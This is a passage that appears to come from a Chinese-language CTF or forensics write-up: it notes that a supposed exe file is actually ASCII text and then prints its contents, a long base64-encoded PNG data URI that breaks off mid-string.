发现它并不是一个exe文件，是一个ASCII text文件，使用cat得到该文件的类容： 1data:image/png;base64,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